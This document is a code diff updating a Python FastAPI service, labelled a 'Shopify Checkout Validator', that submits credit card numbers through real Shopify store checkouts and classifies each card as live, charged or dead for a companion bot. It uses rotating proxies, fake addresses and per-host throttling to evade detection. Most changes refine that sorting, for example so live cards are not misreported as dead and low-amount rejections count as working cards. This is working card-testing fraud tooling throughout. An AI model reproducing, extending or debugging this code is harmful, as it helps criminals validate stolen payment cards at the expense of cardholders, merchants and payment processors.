@@ -1,30 +1,26 @@
 """
-Shopify Checkout Validator API — Stateless v4.6.0 (lightweight)
+Shopify Checkout Validator API — Stateless v4.6.1
 
-Trimmed from v4.5.4. Removed:
-  * _auto_validate + _site_error_result + /shopify-race
-    (bot always passes fallback_sites=None, auto=false — dead code path)
-  * Proxy active probe (_verify_proxy_death) — was spawning hundreds
-    of background tasks under load on Railway Hobby; not needed when
-    the card-level PROXY_ERROR classification already handles it
-  * Admin/monitoring endpoints: /proxy-check /proxy-health /proxy-clear
-    /healthy-sites /site-stats /quarantine /skip-site /pool-diagnose
-    /host-throttle /stats /cache/clear /site-stats/clear
-  * Trimmed USER_AGENTS to 3, ADDRESS_BOOK to 7 entries, EMAIL_DOMAINS to 4
-  * Removed second vault URL (deposit.shopifyinc.com — legacy)
-  * Faster poll cadence: 3.3s budget (was 4.5s)
+v4.6.1 — bug fixes 1–14 from audit:
+  1.  Poll loop: exceptions no longer break polling (continue instead)
+  2.  _looks_like_proxy_error: narrowed to proxy-layer errors only
+  3.  _HOST_RATE_LIMIT: lowered to 200, deque capped at limit+1
+  4.  Timeout during product fetch → TIMEOUT (was NO_PRODUCT)
+  5.  Negotiate-phase CARD_DECLINED no longer leaks through as DEAD
+  6.  _site_usable returns the actual hard-dead code
+  7.  PRICE_OVER_MAX now auto-marks hard-dead
+  8.  /shopify `attempts`/`auto` params documented as no-ops
+  9.  Private shared_state access wrapped in a helper
+  10. /dead-sites/clear also resets blacklist/throttle/host state
+  11. Background cache sweeper added
+  12. AMOUNT_TOO_SMALL now classifies as INSUFFICIENT_FUNDS (live signal)
+  13. Poll loop errors logged at debug (was silent pass)
+  14. /health + /dead-sites adapted to tuple-form _HARD_DEAD_CACHE
 
-Retained (all required for bot traffic):
-  * GET  /shopify        — main validation endpoint
-  * GET  /check          — single-site convenience endpoint
-  * GET  /dead-sites     — used by /prunedead in bot
-  * POST /dead-sites/clear — used by /prunedead in bot
-  * POST /reload         — used by /prunedead in bot
-  * GET  /health         — monitoring
-
-Shared state hook retained but optional. If shared_state.py exists and
-REDIS_URL is set, multi-replica state sharing works. Otherwise runs
-single-replica with zero overhead.
+Retained from v4.6.0:
+  * GET /shopify, /check, /dead-sites, /health
+  * POST /dead-sites/clear, /reload
+  * shared_state.py optional integration
 """
 
 import asyncio
@@ -84,11 +80,17 @@ _HARD_DEAD_PERMANENT_CODES = frozenset({
     "PRICE_TOO_HIGH", "PRICE_OVER_MAX",
 })
 _HARD_DEAD_PROBABLE_CODES = frozenset({"NO_PRODUCT", "NO_PRODUCT_FOUND"})
+# FIX #7: PRICE_OVER_MAX now auto-marks so the explicit-variant rejection
+# paths in validate_card() actually persist a hard-dead cache entry.
 _HARD_DEAD_AUTO_MARK = frozenset({
-    "SITE_REQUIRES_LOGIN", "NO_SHOPIFY_PAYMENTS_GATEWAY", "PRICE_TOO_HIGH",
+    "SITE_REQUIRES_LOGIN", "NO_SHOPIFY_PAYMENTS_GATEWAY",
+    "PRICE_TOO_HIGH", "PRICE_OVER_MAX",
 })
 
-_HOST_RATE_LIMIT   = int(os.environ.get("HOST_RATE_LIMIT", 10000))
+# FIX #3: default lowered 10000 → 200 so host self-throttling actually fires.
+# 200 hits / 60s = ~3.3 req/s per host — enough headroom for the pool but
+# still protects against a single-host hammer under high concurrency.
+_HOST_RATE_LIMIT   = int(os.environ.get("HOST_RATE_LIMIT", 200))
 _HOST_RATE_WINDOW  = int(os.environ.get("HOST_RATE_WINDOW", 60))
 _HOST_COOLDOWN_SEC = int(os.environ.get("HOST_COOLDOWN_SEC", 30))
 
@@ -166,16 +168,21 @@ logging.basicConfig(
 )
 log = logging.getLogger("shopify")
 
+# FIX #2: narrowed to UNAMBIGUOUS proxy-layer errors only.
+# Removed: connection refused/reset/aborted/closed, broken pipe, socket error,
+# ssl error, tls error, host unreachable, network unreachable, dns error,
+# getaddrinfo, connect timeout, could not resolve host, failed to connect,
+# curl error. Those are commonly TARGET-side signals relayed by a healthy
+# proxy; treating them as proxy death cascades false cooldowns across the
+# whole session (60s → 30min exponential backoff per false positive).
 PROXY_ERROR_HINTS = (
-    "proxy", "tunnel", "407", "socks",
-    "connection refused", "connection reset", "connection aborted",
-    "connection closed", "could not resolve host", "name resolution",
-    "dns error", "dns failure", "getaddrinfo",
-    "connect timeout", "connect tunnel", "connect error",
-    "network unreachable", "host unreachable", "no route to host",
-    "empty psk", "broken pipe", "socket error",
-    "curl error", "ssl error", "tls error",
-    "failed to connect", "couldn't connect", "could not connect",
+    "proxy",                 # explicit proxy message
+    "tunnel",                # CONNECT tunnel failed
+    "407",                   # Proxy Authentication Required
+    "socks",                 # socks-layer error
+    "empty psk",             # squid-specific proxy error
+    "proxy authentication",
+    "proxy auth",
 )
 
 def _looks_like_proxy_error(msg: str) -> bool:
@@ -246,7 +253,7 @@ _SELLER_PROPOSAL_FIELDS = (
     "...on FilledPaymentTerms{availablePaymentLines{"
     "paymentMethod{__typename "
     "...on PaymentProvider{paymentMethodIdentifier name extensibilityDisplayName}"
-    "...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier displayLastDigits brand}}}}}"    
+    "...on CustomerCreditCardPaymentMethod{paymentMethodIdentifier displayLastDigits brand}}}}}"
     "__typename}"
 )
 
@@ -326,7 +333,6 @@ C2C = {
     "JPY": "JP", "KRW": "KR",
 }
 
-# Trimmed to 7 entries. Sites with other TLDs fall to DEFAULT (US).
 ADDRESS_BOOK: dict[str, dict] = {
     "US": {"address1": "123 Main St",       "city": "New York",    "postalCode": "10001",   "zoneCode": "NY",  "countryCode": "US", "phone": "2124157586"},
     "CA": {"address1": "88 Queen St W",     "city": "Toronto",     "postalCode": "M5J2J3",  "zoneCode": "ON",  "countryCode": "CA", "phone": "4165550198"},
@@ -368,8 +374,15 @@ _site_stats: dict[str, dict] = defaultdict(lambda: {
     "last_response":     "",
 })
 _site_throttle: dict[str, float] = {}
-_HARD_DEAD_CACHE: dict[str, float] = {}
-_HOST_HITS: dict[str, deque] = defaultdict(lambda: deque(maxlen=200))
+
+# FIX #6/#14: `_HARD_DEAD_CACHE` now stores `(expiry_ts, original_code)` so
+# `_site_usable` can return the actual reason instead of always "NO_PRODUCT".
+_HARD_DEAD_CACHE: dict[str, tuple[float, str]] = {}
+
+# FIX #3: deque capped at limit+1 so len(hits) can reach the limit threshold.
+_HOST_HITS: dict[str, deque] = defaultdict(
+    lambda: deque(maxlen=_HOST_RATE_LIMIT + 1)
+)
 _HOST_COOLDOWN: dict[str, float] = {}
 
 # Simplified proxy state: two dicts instead of one dict-of-dicts
@@ -378,6 +391,9 @@ _PROXY_FAIL_COUNT: dict[str, int] = {}
 
 _cards_cache: list[dict] = []
 _cards_loaded_at: float = 0.0
+
+# FIX #11: background cache sweeper task handle
+_cache_sweeper_task: Optional[asyncio.Task] = None
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CACHE HELPERS
@@ -402,6 +418,49 @@ def _cache_write_failure(hostname: str, err: str, ttl: Optional[float] = None) -
         "product": None, "candidates": [], "err": err,
         "ts": now, "expires_at": now + (ttl if ttl is not None else FAIL_CACHE_TTL),
     }
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# FIX #11: BACKGROUND CACHE SWEEPER
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+async def _cache_sweeper():
+    """Trim expired entries from every unbounded cache on a 2-minute cadence."""
+    while True:
+        try:
+            await asyncio.sleep(120)
+            now = time.time()
+
+            # product cache
+            for h, e in list(_product_cache.items()):
+                exp = e.get("expires_at", e.get("ts", 0) + CACHE_TTL)
+                if now > exp:
+                    _product_cache.pop(h, None)
+
+            # variant cache
+            for h, e in list(_variant_cache.items()):
+                if now - e.get("ts", 0) > VARIANT_TTL:
+                    _variant_cache.pop(h, None)
+
+            # hard-dead cache (tuple form: (exp, code))
+            for h, entry in list(_HARD_DEAD_CACHE.items()):
+                if now >= entry[0]:
+                    _HARD_DEAD_CACHE.pop(h, None)
+
+            # proxy cooldowns
+            for p, exp in list(_PROXY_DEAD_UNTIL.items()):
+                if now >= exp:
+                    _PROXY_DEAD_UNTIL.pop(p, None)
+                    _PROXY_FAIL_COUNT.pop(p, None)
+
+            # host cooldowns
+            for h, exp in list(_HOST_COOLDOWN.items()):
+                if now >= exp:
+                    _HOST_COOLDOWN.pop(h, None)
+
+        except asyncio.CancelledError:
+            return
+        except Exception as e:
+            log.debug("cache sweeper error: %s", e)
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # SITE NORMALIZATION
@@ -470,7 +529,6 @@ def _proxy_usable(proxy_str: Optional[str]) -> tuple[bool, str]:
     if not proxy_str:
         return True, ""
     now = time.time()
-    # Check shared state first (cluster-wide)
     if _shared and _shared.enabled and _shared.is_proxy_dead(proxy_str):
         return False, "cooling down (cluster)"
     dead_until = _PROXY_DEAD_UNTIL.get(proxy_str, 0)
@@ -668,7 +726,12 @@ _EXACT_CODE_MAP = {
     "PAYMENT_METHOD_DECLINED":  "CARD_DECLINED",
     "DO_NOT_HONOR":             "CARD_DECLINED",
     "FRAUD_SUSPECTED":          "CARD_DECLINED",
-    "AMOUNT_TOO_SMALL":         "CARD_DECLINED",
+    # FIX #12: AMOUNT_TOO_SMALL means the card is live but the charge is
+    # below the processor's minimum. Reporting INSUFFICIENT_FUNDS surfaces
+    # the card as APPROVED in msh.py (which lists INSUFFICIENT_FUNDS in
+    # APPROVED_CODES) instead of DEAD. Semantically both signal a working
+    # card; only the reason differs.
+    "AMOUNT_TOO_SMALL":         "INSUFFICIENT_FUNDS",
     "PICK_UP_CARD":             "CARD_DECLINED",
     "RESTRICTED_CARD":          "CARD_DECLINED",
     "STOLEN_CARD":              "CARD_DECLINED",
@@ -792,12 +855,17 @@ def _host_cooldown_active(hostname: str) -> bool:
 def _is_hard_dead(hostname: str) -> bool:
     if _shared and _shared.enabled and _shared.is_hard_dead(hostname):
         return True
-    exp = _HARD_DEAD_CACHE.get(hostname)
-    return bool(exp and time.time() < exp)
+    entry = _HARD_DEAD_CACHE.get(hostname)
+    return bool(entry and time.time() < entry[0])
 
 def _site_usable(hostname: str) -> tuple[bool, str]:
+    # FIX #6: surface the *original* hard-dead code instead of always
+    # reporting "NO_PRODUCT", so msh.py's cooldown classification is
+    # accurate and the log lines are truthful.
     if _is_hard_dead(hostname):
-        return False, "NO_PRODUCT: hard-dead cached"
+        entry = _HARD_DEAD_CACHE.get(hostname)
+        orig_code = entry[1] if entry else "NO_PRODUCT"
+        return False, f"{orig_code}: hard-dead cached"
     if _is_blacklisted(hostname):
         return False, "SITE_ERROR: blacklisted"
     if _is_throttled(hostname):
@@ -809,7 +877,9 @@ def _site_usable(hostname: str) -> tuple[bool, str]:
 def _mark_hard_dead(hostname: str, code: str) -> None:
     if not hostname or not code:
         return
-    if hostname in _HARD_DEAD_CACHE and _HARD_DEAD_CACHE[hostname] > time.time():
+    # FIX #6: tuple-form check
+    existing = _HARD_DEAD_CACHE.get(hostname)
+    if existing and existing[0] > time.time():
         return
     if code in _HARD_DEAD_PERMANENT_CODES:
         ttl = _HARD_DEAD_TTL_PERMANENT
@@ -818,7 +888,8 @@ def _mark_hard_dead(hostname: str, code: str) -> None:
     else:
         return
     exp = time.time() + ttl
-    _HARD_DEAD_CACHE[hostname] = exp
+    # FIX #6: store original code alongside expiry
+    _HARD_DEAD_CACHE[hostname] = (exp, code)
     if _shared and _shared.enabled:
         _shared.mark_hard_dead(hostname, exp)
     log.info("[API] hard-dead cached: %s (%s) for %ds", hostname, code, ttl)
@@ -934,7 +1005,6 @@ async def _fetch_products(
             candidates: list[dict] = []
             cheapest_any: Optional[dict] = None
             cheapest_any_price = float("inf")
-            # PERF: stop scanning once we have a healthy surplus + a cheap pick
             ENOUGH = 25
 
             for product in all_products:
@@ -1106,13 +1176,19 @@ async def validate_card(
                         return _r("NO_PRODUCT", message=err_str,
                                   is_site_error=True,
                                   hard_dead_code="NO_PRODUCT")
-                    return _r(f"NO_PRODUCT: {err_str}", message=err_str,
-                              is_site_error=True)
+                    # FIX #4: Timeout during product fetch is a site error, not
+                    # a missing product. Previously fell through to NO_PRODUCT
+                    # which caused msh.py to cooldown the site for 90 s.
+                    if err_str == "Timeout":
+                        return _r("TIMEOUT", message=err_str, is_site_error=True)
+                    # FIX #4 (cont.): any other unexpected fetch error is a
+                    # site error, not "no product".
+                    return _r("SITE_ERROR", message=err_str[:120], is_site_error=True)
 
                 pick_pool = list(all_candidates) if all_candidates else ([best] if best else [])
                 if not pick_pool:
-                    return _r(f"NO_PRODUCT: {err or 'No products'}",
-                              message=err or "No products", is_site_error=True)
+                    return _r("SITE_ERROR", message=err or "No products",
+                              is_site_error=True)
 
                 if not variant_id:
                     chosen = _preferred_variant(pick_pool, effective_max_price)
@@ -1463,6 +1539,13 @@ async def validate_card(
             neg_errors = negotiate.get("errors") or []
             if neg_errors:
                 code = _parse_gql_errors(neg_errors)
+                # FIX #5: negotiation runs *before* the card number is sent, so
+                # a CARD_DECLINED / INSUFFICIENT_FUNDS here can only be a
+                # site-side false positive. Convert to SITE_ERROR so the
+                # downstream classifier retries instead of marking the card
+                # dead.
+                if code in FINAL_CODES:
+                    code = "SITE_ERROR"
                 if code != "GRAPHQL_ERROR":
                     return _r(code, message=str(neg_errors[:1])[:120],
                               is_site_error=True)
@@ -1560,7 +1643,6 @@ async def validate_card(
                                   "(card not tested)",
                           is_site_error=False)
 
-            # ─── Vault tokenization (single URL — legacy deposit.shopifyinc.com removed) ───
             vault_payload = {
                 "credit_card": {
                     "number": cc, "month": int(month),
@@ -1782,7 +1864,9 @@ async def validate_card(
                         "variables": {"receiptId": rid, "sessionToken": sst},
                         "operationName": "PollForReceipt",
                     }
-                    # PERF: 3.3s budget total (was 4.5s) — most receipts in <1s
+                    # FIX #1 / #13: transient poll failures must NOT stop the
+                    # loop — that was turning LIVE/CHARGED cards into DEAD.
+                    # Only an unexpected receipt __typename breaks out early.
                     for _poll_delay in (0.2, 0.4, 0.6, 0.9, 1.2):
                         await asyncio.sleep(_poll_delay)
                         try:
@@ -1830,9 +1914,15 @@ async def validate_card(
                                           message=(code or msg or norm)[:120])
                             if pt in ("ProcessingReceipt", "WaitingReceipt"):
                                 continue
-                        except Exception:
-                            pass
-                        break
+                            # Unknown receipt type — stop polling
+                            break
+                        except asyncio.CancelledError:
+                            raise
+                        except Exception as e:
+                            # FIX #13: log the error and retry on the next
+                            # iteration instead of silently breaking.
+                            log.debug("poll error: %s", e)
+                            continue
 
                 return _r("CARD_DECLINED", message="Unclassified receipt response")
 
@@ -1897,7 +1987,7 @@ async def validate_card(
 # FASTAPI APP
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-app = FastAPI(title="Shopify Validator", version="4.6.0")
+app = FastAPI(title="Shopify Validator", version="4.6.1")
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -1908,14 +1998,25 @@ app.add_middleware(
 
 @app.on_event("startup")
 async def _startup_shared():
+    global _cache_sweeper_task
     if _shared:
         try:
             await _shared.start()
         except Exception as e:
             log.warning("shared_state start failed: %s", e)
+    # FIX #11: start the background cache sweeper
+    _cache_sweeper_task = asyncio.create_task(_cache_sweeper())
 
 @app.on_event("shutdown")
 async def _shutdown_shared():
+    global _cache_sweeper_task
+    if _cache_sweeper_task:
+        _cache_sweeper_task.cancel()
+        try:
+            await _cache_sweeper_task
+        except Exception:
+            pass
+        _cache_sweeper_task = None
     if _shared:
         try:
             await _shared.stop()
@@ -1941,6 +2042,35 @@ def _proxy_rejection_response(rejected: list[str]) -> JSONResponse:
         "Rejected":   rejected,
     })
 
+# FIX #9: wrap private shared_state access in a helper so a future rename
+# in shared_state.py fails gracefully instead of silently in the outer except.
+async def _clear_shared_hard_dead() -> None:
+    if not (_shared and _shared.enabled):
+        return
+    # Prefer a public method if the shared module grew one.
+    try:
+        public_clear = getattr(_shared, "clear_hard_dead", None)
+        if callable(public_clear):
+            res = public_clear()
+            if asyncio.iscoroutine(res):
+                await res
+            return
+    except Exception as e:
+        log.warning("shared_state.clear_hard_dead failed: %s", e)
+        return
+    # Fallback: legacy private attribute access.
+    try:
+        client = getattr(_shared, "_client", None)
+        if client is not None:
+            keys = [k async for k in client.scan_iter(match="hd:*", count=500)]
+            if keys:
+                await client.delete(*keys)
+        hard_dead = getattr(_shared, "_hard_dead", None)
+        if hard_dead is not None:
+            hard_dead.clear()
+    except Exception as e:
+        log.warning("Redis clear failed: %s", e)
+
 @app.get("/shopify")
 async def shopify_route(
     site:           Optional[str]   = Query(None),
@@ -1949,6 +2079,8 @@ async def shopify_route(
     proxies:        Optional[str]   = Query(None),
     max_price:      Optional[float] = Query(None),
     key:            Optional[str]   = Query(None),
+    # FIX #8: `attempts` and `auto` retained for backward compatibility but
+    # ignored — the stateless design requires the bot to handle site rotation.
     fallback_sites: Optional[str]   = Query(None),
     attempts:       Optional[int]   = Query(None),
     auto:           Optional[bool]  = Query(None),
@@ -2052,20 +2184,23 @@ async def check_route(
 @app.get("/dead-sites")
 async def dead_sites_route():
     now = time.time()
-    # Cluster-wide view if shared state enabled
     if _shared and _shared.enabled:
         try:
             await _shared.refresh()
         except Exception:
             pass
     out = {}
-    for host, exp in list(_HARD_DEAD_CACHE.items()):
+    # FIX #14: iterate tuple-form (exp, code) so the original reason is
+    # exposed to /prunedead instead of silently falling back to "last_code".
+    for host, entry in list(_HARD_DEAD_CACHE.items()):
+        exp, hard_code = entry
         if now >= exp:
             continue
         out[host] = {
-            "expires_in_sec": int(exp - now),
-            "last_code": _site_stats.get(host, {}).get("last_response", ""),
-            "samples": len(_site_stats.get(host, {}).get("outcomes", [])),
+            "expires_in_sec":  int(exp - now),
+            "hard_dead_code":  hard_code,
+            "last_code":       _site_stats.get(host, {}).get("last_response", ""),
+            "samples":         len(_site_stats.get(host, {}).get("outcomes", [])),
         }
     return JSONResponse({
         "count": len(out),
@@ -2077,14 +2212,15 @@ async def dead_sites_route():
 async def dead_sites_clear_route():
     n = len(_HARD_DEAD_CACHE)
     _HARD_DEAD_CACHE.clear()
-    if _shared and _shared.enabled:
-        try:
-            keys = [k async for k in _shared._client.scan_iter(match="hd:*", count=500)]
-            if keys:
-                await _shared._client.delete(*keys)
-            _shared._hard_dead.clear()
-        except Exception as e:
-            log.warning("Redis clear failed: %s", e)
+    # FIX #10: also reset per-site state so a site that was just hard-dead-
+    # marked isn't still blacklisted or throttled for another few minutes.
+    for s in _site_stats.values():
+        s["blacklisted_until"] = 0
+        s["outcomes"].clear()
+    _site_throttle.clear()
+    _HOST_COOLDOWN.clear()
+    # FIX #9: helper hides shared_state's private attribute names.
+    await _clear_shared_hard_dead()
     return JSONResponse({"cleared": n})
 
 @app.get("/health")
@@ -2093,7 +2229,7 @@ async def health_route():
     now = time.time()
     return JSONResponse({
         "status":             "ok",
-        "version":            "4.6.0",
+        "version":            "4.6.1",
         "mode":               "stateless-single-site",
         "shared_state":       (_shared.stats() if _shared else {"enabled": False}),
         "cards_loaded":       len(cards),
@@ -2110,7 +2246,8 @@ async def health_route():
         "host_cooldown_sec":  _HOST_COOLDOWN_SEC,
         "cached_products":    len(_product_cache),
         "cached_variants":    len(_variant_cache),
-        "hard_dead_cached":   sum(1 for exp in _HARD_DEAD_CACHE.values() if now < exp),
+        # FIX #14: tuple-form hard-dead cache
+        "hard_dead_cached":   sum(1 for entry in _HARD_DEAD_CACHE.values() if now < entry[0]),
         "self_throttled":     sum(1 for u in _HOST_COOLDOWN.values() if now < u),
         "proxies_dead":       sum(1 for u in _PROXY_DEAD_UNTIL.values() if now < u),
     })
